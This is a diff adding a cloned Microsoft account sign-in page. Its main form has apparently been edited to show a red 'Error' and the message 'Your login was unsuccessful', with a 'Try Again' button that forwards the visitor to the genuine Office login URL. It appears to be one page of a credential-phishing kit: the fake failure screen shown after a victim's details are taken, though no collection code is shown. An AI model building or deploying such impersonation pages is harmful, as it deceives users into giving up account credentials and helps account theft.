@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html dir="ltr" class="" lang="en">
+<head>
+    <title>Sign in to your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <meta name="PageID" content="ConvergedSignIn">
+    <meta name="SiteID" content="">
+    <meta name="ReqLC" content="1033">
+    <meta name="LocLC" content="en-US">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="robots" content="none">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link crossorigin="anonymous" href="https://acctcdn.msftauth.net/converged_ux_v2_nBE5FSqn9KpH44ZlTc3VqQ2.css?v=1" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-TqoUqMR1ES9yIyfufvoPZtbBlS45Wz8Ej67inmpRf+E+xT4pnhKnIo+Nbr/TVyra">
+    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_NnFX4S8X6vb-OgGnD82WNA2.js" onerror="$Loader.OnError(this)" onload="$Loader.OnSuccess(this)"></script>
+    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_drcggiwi0cystfohuwx04a2.js" onerror="$Loader.OnError(this)" onload="$Loader.OnSuccess(this)" integrity="sha384-QGN9amI//jyhPiLF51uKD3Vg8IrIdrb5Utp6PTYX/61yLXqJA2rV1QTkBpQaIGb7"></script>
+    <script charset="utf-8" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pcustomizationloader_f3782014f3739160dbfd.js"></script>
+    <script charset="utf-8" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pfetchsessionsprogress_85acbcb9234972130506.js"></script>
+    <script charset="utf-8" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pstringcustomizationhelper_44ba818dfa55d8749503.js"></script>
+</head>
+<body style="" class="ltr  Chrome _Win _M110 _D0 Full Win81 RE_WebKit hide-cookie-banner dark animate" lang="en-US">
+        <div class="App" id="iPageElt">
+    
+    <script type="text/javascript">
+        var WIZARDUIConfig =
+        {
+            fInlineVisible: false,
+            fBackEnabled: true,
+            fNextEnabled: true,
+            fLastPage: false,
+            oTimeout: null,
+            urlAJAXPath: 'https://account.live.com/query.aspx',
+            imagebaseurl: 'https://acctcdn.msftauth.net/images/',
+            imgNextEnabled: "oobe.arrow.next.light.png",
+            imgNextDisabled: "oobe.arrow.next.light.disabled.png",
+            imgPreviousEnabled: "oobe.arrow.previous.light.png",
+            imgPreviousDisabled: "oobe.arrow.previous.light.disabled.png"
+        };
+
+        
+        var WIZARDUI =
+        {
+            fInlineVisible: WIZARDUIConfig.fInlineVisible,
+            fBackEnabled: WIZARDUIConfig.fBackEnabled,
+            fNextEnabled: WIZARDUIConfig.fNextEnabled,
+            fLastPage: WIZARDUIConfig.fLastPage,
+            oTimeout: WIZARDUIConfig.oTimeout,
+            ServerData: { urlAJAXPath: WIZARDUIConfig.urlAJAXPath },
+
+            setButtonState: function (fBackEnabled, fNextEnabled, fLastPage) {
+                $PageHelper.byId('iCancel').prop('disabled', !fBackEnabled);
+                $PageHelper.byId('iNext').prop('disabled', !fNextEnabled);
+                if (typeof (ExternalHelper) !== 'undefined')
+                {
+                    ExternalHelper.setWizardButtons(fBackEnabled, fNextEnabled, fLastPage);
+                }
+            },
+            setHeaderText: function (sHeaderText) {
+                if (typeof (ExternalHelper) !== 'undefined')
+                {
+                    ExternalHelper.setHeaderText(sHeaderText);
+                }
+            },
+            doFinalBack: function () {
+                try
+                {
+                    if (window["webkit"] && window["webkit"].messageHandlers)
+                    {
+                        window["webkit"].messageHandlers.FinalBack.postMessage("");
+                    }
+                    else
+                    {
+                        window["external"].FinalBack();
+                    }
+                }
+                catch (e) { }
+            },
+            doFinalNext: function () {
+                try
+                {
+                    if (window["webkit"] && window["webkit"].messageHandlers)
+                    {
+                        window["webkit"].messageHandlers.FinalNext.postMessage("");
+                    }
+                    else
+                    {
+                        window["external"].FinalNext();
+                    }
+                }
+                catch (e) { }
+            },
+
+            doFatalError: function (sExtError) {
+                //TODO
+                WIZARDUI.doFinalNext();
+            },
+            populatePropertyBag: function (oProps) {
+                $PageHelper.each(oProps,
+                    function (sName, oVal) {
+                        if (typeof (ExternalHelper) !== 'undefined')
+                        {
+                            ExternalHelper.setProperty(sName, oVal);
+                        }
+                    });
+            },
+            hideInlineParts: function () {
+                $PageHelper.byId('iTOU').hide();
+                $PageHelper.byId('iPriv').hide();
+            },
+            showProgress: function () {
+                $PageHelper.byId('maincontent').hide();
+                $PageHelper.byId('identityPageBanner').hide();
+                $PageHelper.byId('iWizardInline').show();
+
+                WIZARDUI.setButtonState(false, false, false);
+                WIZARDUI.oTimeout = setTimeout(function () { $PageHelper.byId('iPageProgress').show(); }, 2000);
+            },
+            hideProgress: function () {
+                if (WIZARDUI.oTimeout) {
+                    clearTimeout(WIZARDUI.oTimeout);
+                    WIZARDUI.oTimeout = null;
+                }
+
+                $PageHelper.byId('iPageProgress').hide();
+                $PageHelper.byId('iWizardInline').hide();
+                $PageHelper.byId('maincontent').show();
+                $PageHelper.byId('identityPageBanner').show();
+
+                WIZARDUI.setButtonState(WIZARDUI.fBackEnabled, WIZARDUI.fNextEnabled, WIZARDUI.fLastPage);
+            },
+            evt_inlineLink_onclick: function (oEvt) {
+                $PageHelper.byId('maincontent').hide();
+                $PageHelper.byId('identityPageBanner').hide();
+                $PageHelper.byClassName('logo').hide();
+                $PageHelper.byClassName('background-logo-holder').hide();
+                $PageHelper.byId('iWizardInline').show();
+
+                $PageHelper.each(oEvt.data.toShow, function (idx, sId) { $PageHelper.queryAll(sId).show(); });
+                oEvt.stopPropagation();
+                oEvt.preventDefault();
+                setFocus(true);
+
+                WIZARDUI.setButtonState(true, true, false);
+                WIZARDUI.fInlineVisible = true;
+            }
+        };
+
+        function OnBack() {
+            if (WIZARDUI.fInlineVisible) {
+                WIZARDUI.hideInlineParts();
+                $PageHelper.byId('iWizardInline').hide();
+                $PageHelper.byClassName('logo').show();
+                $PageHelper.byClassName('background-logo-holder').show();
+                $PageHelper.byId('maincontent').show();
+                $PageHelper.byId('identityPageBanner').show();
+
+                WIZARDUI.setButtonState(WIZARDUI.fBackEnabled, WIZARDUI.fNextEnabled, WIZARDUI.fLastPage);
+                WIZARDUI.fInlineVisible = false;
+            }
+            else if (typeof (FORM) != "undefined" && FORM.Current) {
+                // ensure no animation glitchiness
+                $PageHelper.get(document.body).removeClass('animate');
+                FORM.Current.evt_backButton_onclick();
+            }
+            else {
+                var wLive = window.wLive;
+                var pageEvents = wLive && wLive.Account && wLive.Account.PageEvents;
+                if (pageEvents) {
+                    pageEvents.$.triggerHandler(pageEvents.back);
+                }
+            }
+        }
+
+        function OnNext() {
+            if (WIZARDUI.fInlineVisible) {
+                WIZARDUI.hideInlineParts();
+                $PageHelper.byId('iWizardInline').hide();
+                $PageHelper.byClassName('logo').show();
+                $PageHelper.byClassName('background-logo-holder').show();
+                $PageHelper.byId('maincontent').show();
+                $PageHelper.byId('identityPageBanner').show();
+
+                WIZARDUI.setButtonState(WIZARDUI.fBackEnabled, WIZARDUI.fNextEnabled, WIZARDUI.fLastPage);
+                WIZARDUI.fInlineVisible = false;
+            }
+            else if (typeof (FORM) != "undefined" && FORM.Current) {
+                // ensure no animation glitchiness
+                $PageHelper.get(document.body).removeClass('animate');
+                FORM.Current.evt_nextButton_onclick();
+            }
+            else {
+                var wLive = window.wLive;
+                var pageEvents = wLive && wLive.Account && wLive.Account.PageEvents;
+                if (pageEvents) {
+                    pageEvents.$.triggerHandler(pageEvents.next);
+                }
+            }
+        }
+
+        // To help improve keyboard accessibility we try to set focus on the first user input element.
+        function setFocus(fInlineFocus) {
+            if (!fInlineFocus && typeof (FORM) != "undefined" && FORM.Current && FORM.Current.fields.length > 0) {
+                FORM.Current.setFocus();
+            }
+            else {
+                var container = $PageHelper.queryAll(fInlineFocus ? '#iWizardInline' : 'form');
+                if (container.length === 0)
+                {
+                    $PageHelper.queryAll('input,input.btn-primary,button,select,a').not(':hidden').first().focus();
+                }
+                else
+                {
+                    $PageHelper.queryAll('input,input.btn-primary,button,select,a', container).not(':hidden').first().focus();
+                }
+            }
+        }
+
+        function evt_master_onload()
+        {
+            var elStyleCheck = document.createElement('div');
+            elStyleCheck.className = 'hide';
+            document.body.appendChild(elStyleCheck);
+
+            // if the style wasn't applied correctly, the CSS failed to download
+            if (window.getComputedStyle && window.getComputedStyle(elStyleCheck).display.toLowerCase() !== "none")
+            {
+                WIZARDUI.doFatalError('1260');
+                return;
+            }
+
+            document.body.removeChild(elStyleCheck);
+
+            WIZARDUI.setButtonState(WIZARDUI.fBackEnabled, WIZARDUI.fNextEnabled, WIZARDUI.fLastPage);
+            WIZARDUI.setHeaderText('Verify your account');
+
+            var $body = $PageHelper.get(document.body);
+            var $centipede = $PageHelper.byClassName("img-centipede");
+            var $ftrLogo = $PageHelper.byId("ftrLogo");
+            var backgroundColor = $body.css("backgroundColor").toLowerCase().replace(new RegExp(" ", "g"), "");
+            if (backgroundColor === "rgb(255,255,255)" || backgroundColor === "#ffffff" || backgroundColor === "#fff")
+            {
+                $body.addClass("light");
+                $centipede.attr("src", "https://acctcdn.msftauth.net/images/AppCentipede/AppCentipede_Microsoft_HFeToeM4u6fzMQF_f_rQ5Q2.svg");
+                $ftrLogo.html("<img role='presentation' src='https://acctcdn.msftauth.net/images/Microsoft_Logotype_Gray_X-qkgtg8KmnQEvm_9mDTcw2.svg' alt='Microsoft' aria-hidden='true'/>");
+            }
+            else if (backgroundColor === "rgb(0,0,0)" || backgroundColor === "#000000" || backgroundColor === "#000")
+            {
+                $centipede.attr("src", "https://acctcdn.msftauth.net/images/AppCentipede/AppCentipede_Microsoft_white_ufRYlllWOw4YyDRiKcBvxQ2.svg");
+                $ftrLogo.html("<img role='presentation' src='https://acctcdn.msftauth.net/images/Microsoft_Logotype_White_4MYDQRab31HKDWWN-1HafA2.svg' alt='Microsoft' aria-hidden='true'/>");
+            }
+            else
+            {
+                $body.addClass("dark");
+            }
+
+            
+            
+
+            setTimeout(function ()
+            {
+                $PageHelper.get(document.body).addClass('animate');
+                $PageHelper.byId('maincontent').show();
+                $PageHelper.byId('identityPageBanner').show();
+            });
+        }
+
+        
+        var HOSTUI =
+        {
+            ServerData: { urlAJAXPath: 'https://account.live.com/query.aspx' },
+            evt_inlineLink_onclick: function(oEvt)
+            {
+                $PageHelper.queryAll("#iPriv, #iTOU, #iImpressum, #iA11yConforme").hide();
+
+                $PageHelper.byId('maincontent').hide();
+                $PageHelper.byId('identityPageBanner').hide();
+                $PageHelper.byClassName('logo').hide();
+                $PageHelper.byClassName('background-logo-holder').hide();
+                $PageHelper.byId('iHostInline').show();
+
+                $PageHelper.each(oEvt.data.toShow, function(idx, sId) { $PageHelper.queryAll(sId).show(); });
+                oEvt.preventDefault();
+                setFocus(true);
+            },
+            evt_inlineBack_onclick: function(oEvt)
+            {
+                $PageHelper.queryAll("#iPriv, #iTOU, #iImpressum, #iA11yConforme").hide();
+
+                $PageHelper.byId('iHostInline').hide();
+                $PageHelper.byClassName('logo').show();
+                $PageHelper.byClassName('background-logo-holder').show();
+                $PageHelper.byId('maincontent').show();
+                $PageHelper.byId('identityPageBanner').show();
+                setFocus();
+            },
+            setFocus: function(fInlineFocus)
+            {
+                if (!fInlineFocus && typeof(FORM) != "undefined" && FORM.Current && FORM.Current.fields.length > 0)
+                {
+                    FORM.Current.setFocus();
+                }
+                else
+                {
+                    var container = $PageHelper.queryAll(fInlineFocus ? '#iHostInline' : 'form');
+                    if (container.length === 0)
+                    {
+                        $PageHelper.queryAll('input,input.btn-primary,button,select,a').not(':hidden').first().focus();
+                    }
+                    else
+                    {
+                        $PageHelper.queryAll('input,input.btn-primary,button,select,a', container).not(':hidden').first().focus();
+                    }
+                }
+            }
+        };
+    </script>
+    
+
+        <div id="c_base" class="c_base">
+        <div id="c_content">
+            
+    
+<!--background -->
+<div class="background " role="presentation">
+    
+    <div id="cnvCtrlBgImg" class="backgroundImage" style="background-image: url(&quot;https://acctcdn.msftauth.net/images/2_vD0yppaJX3jBnfbHF1hqXQ2.svg&quot;);"></div>
+<script type="text/javascript">
+$Do.when("doc.load",function(){document.getElementById("cnvCtrlBgImg").style.backgroundImage="url(https://acctcdn.msftauth.net/images/2_vD0yppaJX3jBnfbHF1hqXQ2.svg)";});
+</script>
+    
+</div>
+
+<!-- environment banner -->
+
+
+<!--lightbox -->
+<div class="outer" role="presentation">
+    
+    <div class="middle ">
+        
+        <!-- header -->
+        
+        <div id="inner" class="inner ">
+            
+            <div aria-live="assertive">
+                <div id="progressBarLightbox" style="display:none;" aria-label="Please wait"></div>
+            </div>
+            <div class="win-scroll">
+                
+                <img class="logo" src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg" role="img" alt="Microsoft">
+                
+                <div id="pageContent" class="pagination-view">
+                    
+                        <div id="identityPageBanner" class="identityBanner no-margin-bottom" role="banner">
+                            
+                            <button id="bannerBackButton" type="button" aria-describedby="iPageTitle" aria-label="Back" class="backButton" style="display: none" disabled="disabled">
+                                <img id="backArrowImage" role="presentation" src="https://acctcdn.msftauth.net/images/Arrows/left_qcwoJO81F7bEFg3Pj_fUEA2.svg">
+                            </button>
+                            
+                            <div id="displayName" class="identity"><span style="color:red; font-size: 24px">Error</span>
+                            
+                        </div>
+                        </div>
+                        
+            
+            <div role="main" id="maincontent" class="">
+                
+    
+    <div id="pageControlHost" class="confirmIdentityPageControl">
+    <div class="confirmIdentity" style="opacity: 1;"><div class="" style="opacity: 1;"><form id="pageDialogForm_1" action="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638119666042062911.YzQ3MWU3MWUtY2YxMC00MDE1LTk4MzktZmRmNjdmNzAyMDNlNDRjOWY5Y2YtYzJjMC00ZTI5LWIxM2QtZWYxYjI2NjM4NzRk&ui_locales=en&mkt=en&client-request-id=ad7c3dcd-b91c-4926-a88e-a8a70bd7a646&state=h_i4y8rd6cm6mpEb_GTFsiGVo4cs08wtHIMJ4skIPI_ouse4GGYc9evvJNo6ocNOwoMPlrYm2tH1q7P6l8cXcOm_HR1STJX1akRzdrLwzzfXcUmf115GEPvypSFhQgkmnU24P1ji5GiDQgzjoZD8J-gU48jKHQw80r9HsL-J9X0fJMSpJuCmnw__MtBCr0T2h4YuOsKmeT5jUO9XEE2dQzHlfxnXYUAfcOxea0cudri4oBm80OVfaHp1jocty0rnmza9NY5DJsScuru6bou84WqHwMIxYEGn9tchsXzvnoA&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0" method="post" class=""><div id="iVerifyCode">
+        <div id="iVerifyCodeTitle" class="text-title" aria-level="1" role="heading"></div>
+        <div id="iEnterCode" class="row">
+            <div class="OTTLabel text-block-body form-group" id="iEnterSubhead">Your login was unsuccessful. Please check your information and try again</div>
+            
+            <div class="position-buttons">
+                <div class="row">
+                    <div class="button-container">
+                         <div class="inline-block">
+                            <input type="submit" id="iVerifyCodeAction" class="btn btn-block btn-primary" value="Try Again">
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div></form></div></div></div>
+    
+
+            </div>
+            
+            <div role="main" class="c_inmiddle_area" id="dynamiccontent" style="display:none" aria-hidden="true">
+                
+    <div id="confirmIdentityTemplates" class="hide">
+        
+    </div>
+
+            </div>
+        
+                    
+                    <!--tou/privacy-->
+                    <div id="iHostInline" class="Hide">
+                        
+                            <div class="btn-group">
+                                <div class="col-xs-24">
+                                    <input type="button" autofocus="" onclick="HOSTUI.evt_inlineBack_onclick();" class="btn btn-block win-button btn-primary primary" id="iHostInlineCancel" value="Back">
+                                </div>
+                            </div>
+                            
+                        <pre id="iPriv" class="text-block-body pre-wrap-format" style="display: none">                            Please wait
+                        </pre>
+                        <pre id="iTOU" class="text-block-body pre-wrap-format" style="display: none">                            Please wait
+                        </pre>
+                        <div id="iImpressum" class="text-block-body" style="display: none">
+                            Please wait
+                        </div>
+                        <div id="iA11yConforme" class="text-block-body" style="display: none">
+                            Please wait
+                        </div>
+                        
+                        <div class="btn-group">
+                            <div class="col-xs-24">
+                                <input type="button" onclick="HOSTUI.evt_inlineBack_onclick();" class="btn btn-block win-button btn-primary primary" id="iHostInlineCancel2" value="Back">
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- footer -->
+        
+        <div id="footer" class="footer
+            default" role="contentinfo">
+            <div class="footerNode text-secondary">
+                
+                <a id="footerSignout" href="https://login.live.com/logout.srf?ct=1676368126&amp;rver=7.3.6960.0&amp;lc=1033&amp;id=38936&amp;ru=https%3A%2F%2Flogin.live.com%2Foauth20_authorize.srf%3Fuaid%3D36070b0757784c35aa59b7f1d5a51c3f%26client_id%3D4765445b-32c6-49b0-83e6-1d93765276ca%26opid%3DC3D4F443C5B823DC%26mkt%3DEN-US%26opidt%3D1676368124&amp;mkt=en-US&amp;uaid=36070b0757784c35aa59b7f1d5a51c3f">Sign out</a>
+                <a target="_blank" rel="noreferrer noopener" id="terms" href="https://www.microsoft.com/en-us/servicesagreement/default.aspx">Terms of Use</a> <a target="_blank" rel="noreferrer noopener" id="privacy" href="https://go.microsoft.com/fwlink/?LinkID=521839">Privacy &amp; Cookies</a>
+                
+            </div>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<style>
+    .inner
+    {
+        min-width:0;
+    }
+</style>
+
+
+            
+        </div>
+    </div></div><script type="text/javascript">//<![CDATA[
+var w=window;w.Telemetry=w.Telemetry||{},w.Telemetry.EClientEvent={"Account_Signup_SwitchSignupType":1e4,"Account_Signup_MemberName_ValidationError":10001,"Account_ResetPW_SeeMoreVerificationOptions":11e3,"Account_ResetPW_SelectedVerificationOption":11001,"Account_ResetPW_OTT_ValidationError":11002,"Account_ResetPW_SeeMoreSecondaryAction":11003,"Account_Signup_Phone":11004,"Account_Signup_EASI":11005,"Account_Signup_Live":11006,"Account_DeviceFingerPrinting_Iframe_Load":11007,"Signin_Email_Phone_Skype":11008,"Signin_Submit":11009,"Signup_ChinaPIPLConsent_UserAction":11010},!function(t,e){"object"==typeof exports&&"object"==typeof module?module.exports=e():"function"==typeof define&&define.amd?define([],e):"object"==typeof exports?exports.Telemetry=e():(t.Microsoft=t.Microsoft||{},t.Microsoft.Identity=t.Microsoft.Identity||{},t.Microsoft.Identity.UX=t.Microsoft.Identity.UX||{},t.Microsoft.Identity.UX.Telemetry=e())
+}(window,function(){return function(t){function e(e){for(var n,i,o=e[0],s=e[1],a=0,c=[];a<o.length;a++){i=o[a],Object.prototype.hasOwnProperty.call(r,i)&&r[i]&&c.push(r[i][0]),r[i]=0}for(n in s){Object.prototype.hasOwnProperty.call(s,n)&&(t[n]=s[n])}for(p&&p(e);c.length;){c.shift()()}}function n(e){if(i[e]){return i[e].exports}var r=i[e]={"i":e,"l":!1,"exports":{}};return t[e].call(r.exports,r,r.exports,n),r.l=!0,r.exports}var i={},r={"1":0,"0":0};n.e=function(t){var e=[],i=r[t];if(0!==i){if(i){e.push(i[2])}else{var o=new Promise(function(e,n){i=r[t]=[e,n]
+});e.push(i[2]=o);var s,a=document.createElement("script");a.charset="utf-8",a.timeout=120,n.nc&&a.setAttribute("nonce",n.nc),a.src=n.p+"oneDs_5ebf1762f86e0d32779c.js";var p=new Error;s=function(e){a.onerror=a.onload=null,clearTimeout(c);var n=r[t];if(0!==n){if(n){var i=e&&("load"===e.type?"missing":e.type),o=e&&e.target&&e.target.src;p.message="Loading chunk "+t+" failed.\n("+i+": "+o+")",p.name="ChunkLoadError",p.type=i,p.request=o,n[1](p)}r[t]=void 0}};var c=setTimeout(function(){s({"type":"timeout","target":a})
+},12e4);a.onerror=a.onload=s,document.head.appendChild(a)}}return Promise.all(e)},n.m=t,n.c=i,n.d=function(t,e,i){n.o(t,e)||Object.defineProperty(t,e,{"enumerable":!0,"get":i})},n.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{"value":"Module"}),Object.defineProperty(t,"__esModule",{"value":!0})},n.t=function(t,e){if(1&e&&(t=n(t)),8&e){return t}if(4&e&&"object"==typeof t&&t&&t.__esModule){return t}var i=Object.create(null);if(n.r(i),Object.defineProperty(i,"default",{"enumerable":!0,"value":t}),2&e&&"string"!=typeof t){for(var r in t){n.d(i,r,function(e){return t[e]
+}.bind(null,r))}}return i},n.n=function(t){var e=t&&t.__esModule?function(){return t["default"]}:function(){return t};return n.d(e,"a",e),e},n.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},n.p="",n.oe=function(t){throw console.error(t),t};var o=window.telemetry_webpackJsonp=window.telemetry_webpackJsonp||[],s=o.push.bind(o);o.push=e,o=o.slice();for(var a=0;a<o.length;a++){e(o[a])}var p=s;return n(n.s=3)}([function(t,e){var n;!function(t){t.AddListener=function(t,e,n){if(t&&"function"==typeof t.addEventListener){t.addEventListener(e,n)
+}else{if(!t||!t.attachEvent){throw"Browser supports neither addEventListener nor attachEvent"}t.attachEvent("on"+e,n)}},t.GenerateGUID=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t){var e,n,i=(e=0,n=16,Math.floor(Math.random()*Math.floor(n-e))+e);return"y"===t&&(i&=11),i.toString(16)})},Object.keys||(Object.keys=function(){"use strict";var t=Object.prototype.hasOwnProperty,e=!{"toString":null}.propertyIsEnumerable("toString"),n=["toString","toLocaleString","valueOf","hasOwnProperty","isPrototypeOf","propertyIsEnumerable","constructor"],i=n.length;
+return function(r){if("function"!=typeof r&&("object"!=typeof r||null===r)){throw new TypeError("Object.keys called on non-object")}var o,s,a=[];for(o in r){t.call(r,o)&&a.push(o)}if(e){for(s=0;i>s;s++){t.call(r,n[s])&&a.push(n[s])}}return a}}()),Array.prototype.indexOf||(Array.prototype.indexOf=function(t,e){if(null==this){throw new TypeError("'this' is null or not defined")}var n=this.length>>>0;for(e=+e||0,Math.abs(e)===1/0&&(e=0),0>e&&(e+=n)<0&&(e=0);n>e;e++){if(this[e]===t){return e}}return-1})}(n||(n={})),e.AddListener=n.AddListener,e.GenerateGUID=n.GenerateGUID
+},,function(t,e,n){var i,r=window.ServerData||{},o=window.document.querySelector("script[nonce]"),s=o?o.nonce||o.getAttribute("nonce"):void 0;n.nc=s,n.p=(r.urlCdn||r.a)+"content/js/",function(t){var e=n(0),i=window,r=function(){function t(t){this._preSendHandlers=[],this._eventProvider=t}return t.prototype.initialize=function(t){return this._eventApiConfig=t,this._eventDict={},this._eventProvider.initialize(t)},t.prototype.set=function(t,e,n){void 0===n&&(n="data"),void 0===this._eventDict[n]&&(this._eventDict[n]={}),null!=e&&(this._eventDict[n][t]=e)
+},t.prototype.get=function(t,e){return void 0===e&&(e="data"),this._eventDict[e][t]},t.prototype.hasEvents=function(){return this._numEvents()>0},t.prototype.hasEvent=function(t,e){return void 0===e&&(e="data"),void 0!==this._eventDict[e][t]},t.prototype.clear=function(){this._eventDict={}},t.prototype.post=function(t,e){for(var n=0,i=this._preSendHandlers;n<i.length;n++){i[n](e)}if(this.hasEvents()){var r=[];if(t){var o=this._eventDict.data;delete this._eventDict.data,r=[o,this._eventDict.cloud,this._eventDict.app],this.validKeysPresent(r)&&this._eventProvider.post({"name":t,"data":o,"ext":this._eventDict})
+}else{r=[this._eventDict.cloud,this._eventDict.app],this.validKeysPresent(r)&&this._eventProvider.post(this._eventDict)}this.clear()}},t.prototype.validKeysPresent=function(t){for(var e=/^\w+$/,n=0;n<t.length;n++){for(var i in t[n]){if(t[n].hasOwnProperty(i)&&!e.test(i)){return!1}}}return!0},t.prototype.addPreSendHandler=function(t,e){this._preSendHandlers.push(function(n){t(e,n)})},t.prototype._numEvents=function(){return Object.keys(this._eventDict).length},t}();t.EventApi=r;var o=function(){function t(){this._iduxProviderUrl="https://js.monitor.azure.com/scripts/c/ms.analytics-web-2.min.js",this._isAppInsightsLoaded=!1,this._pendingEventQueue=[]
+}return t.prototype.initialize=function(t){var r=this,o=this;return this._args=t,i.Telemetry.appInsights?(o._isAppInsightsLoaded=!0,!0):(this._args.providerUrl?o._checkIfOneDsScriptExists(this._args.providerUrl)?o._initializeAppInsights(new i.oneDS.AppInsightsCore,new i.oneDS.PostChannel):e.AddListener(i,"load",function(){var t=i.document.createElement("script");t.src=r._args.providerUrl||r._iduxProviderUrl,t.type="text/javascript",s&&t.setAttribute("nonce",s),e.AddListener(t,"load",function(){o._initializeAppInsights(new i.oneDS.AppInsightsCore,new i.oneDS.PostChannel)
+}),i.document.body.appendChild(t)}):n.e(2).then(function(){var t=n(1),e=n(1);o._initializeAppInsights(new t.AppInsightsCore,new e.PostChannel)}.bind(null,n))["catch"](n.oe),!0)},t.prototype.post=function(t){this._isAppInsightsLoaded?this._postToAppInsights([t]):this._pendingEventQueue.push(t)},t.prototype._postToAppInsights=function(t){for(var e=0,n=t;e<n.length;e++){var r=n[e];this._isAppInsightsManager(i.Telemetry.appInsights)?(this._appInsights||(this._appInsights=i.Telemetry.appInsights.newInst(this._args.appInsightsConfig.instrumentationKey,[],[])),this._appInsights.track(r)):i.Telemetry.appInsights.track(r)
+}},t.prototype._initializeAppInsights=function(t,e){i.Telemetry.appInsights||(i.Telemetry.appInsights=this._args.appInsightObject?this._args.appInsightObject:this._createAppInsightsCore(t,e)),this._isAppInsightsLoaded=!0,this._pendingEventQueue.length>0&&this._postToAppInsights(this._pendingEventQueue)},t.prototype._checkIfOneDsScriptExists=function(t){for(var e=document.getElementsByTagName("script"),n=0;n<e.length;n++){if(e[n].src===t){return!0}}return!1},t.prototype._isAppInsightsManager=function(t){return"function"==typeof t.newInst
+},t.prototype._createAppInsightsCore=function(t,e){var n={"instrumentationKey":this._args.appInsightsConfig.instrumentationKey,"extensions":[e],"extensionConfig":[]};return n.extensionConfig[e.identifier]={"eventsLimitInMem":50},this._args.appInsightsConfig&&(n.extensionConfig=this._args.appInsightsConfig),t.initialize(n,[]),t},t}();t.OneDSEventProvider=o;var a=function(){function t(){}return t.prototype.initialize=function(){return!0},t.prototype.post=function(){},t}();t.EmptyEventProvider=a}(i||(i={})),e.EventApi=i.EventApi,e.OneDSEventProvider=i.OneDSEventProvider,e.EmptyEventProvider=i.EmptyEventProvider
+},function(t,e,n){var i;!function(t){var e=n(0),i=n(2),r=i.EventApi,o=i.EmptyEventProvider,s=i.OneDSEventProvider,a=window,p=n(4),c=function(){function t(t){var e=this;if(this._nonIndexedDataPoint={},this._enabled=!0,this._clientEventsConfig=t||{},this._enabled=this._clientEventsConfig.telemetryEnabled,this._enabled){if(this._eventApi=new r(this._clientEventsConfig.useOneDSEventApi?new s:new o),this._serverPageID=this._clientEventsConfig.hostPageID?this._clientEventsConfig.hostPageID.toString():"",this._serviceID=this._clientEventsConfig.serviceID?this._clientEventsConfig.serviceID.toString():"",this._eventApi.initialize(this._clientEventsConfig),this.addPreSendHandler(function(t){e._setPerRequestDataPoints(t)
+}),this._clientEventsConfig.autoPost){var n=this;setInterval(function(){(n.hasPageEvents()||n._eventApi.hasEvents())&&n.post(!1)},this._clientEventsConfig.flush)}this._addUnloadHandlers()}}return t.prototype.get=function(t,e,n){return void 0===e&&(e="data"),void 0===n&&(n=!1),this._enabled?n?this._eventApi.get(t,e):this._nonIndexedDataPoint[t]:void 0},t.prototype.set=function(t,e,n,i){void 0===n&&(n=!1),this._enabled&&(n?this._eventApi.set(t,e,i):this._nonIndexedDataPoint[t]=e)},t.prototype.append=function(t,e,n){var i;
+void 0===n&&(n=!1),this._enabled&&((i=n?this._eventApi.get(t):this._nonIndexedDataPoint[t])?i instanceof Array||(i=[i]):i=[],i.push(e),n?this._eventApi.set(t,i):this._nonIndexedDataPoint[t]=i)},t.prototype.appendClientEvent=function(t,e,n){if(this._enabled){this._isNumeric(t)&&(t=this._getNumericValue(t));var i="number"==typeof t?t:a.Telemetry.EClientEvent[t];this.append("ClientEvents",{"ID":i,"EventTime":this._getCurrentTime(),"Value":e,"DataViewID":n})}},t.prototype.addPreSendHandler=function(t,e){this._enabled&&this._eventApi.addPreSendHandler(function(e,n){t(n&&n.isViewTransition,e)
+},e)},t.prototype.post=function(t,e){if(this._enabled){e=e||this._clientEventsConfig.defaultEventName;var n=Object.keys(this._nonIndexedDataPoint).length;(n>0&&t||n>=this._clientEventsConfig.minEvents)&&(this._eventApi.set(p.NonIndexedDataPointKey,JSON.stringify(this._nonIndexedDataPoint)),this._nonIndexedDataPoint={}),this._eventApi.hasEvents()&&this._eventApi.post(e,{"isViewTransition":t})}},t.prototype.postPageView=function(t,e){this._enabled&&(e=e||this._clientEventsConfig.defaultEventName,this.set("ViewID",t,!0),this._eventApi.post(e,!1))
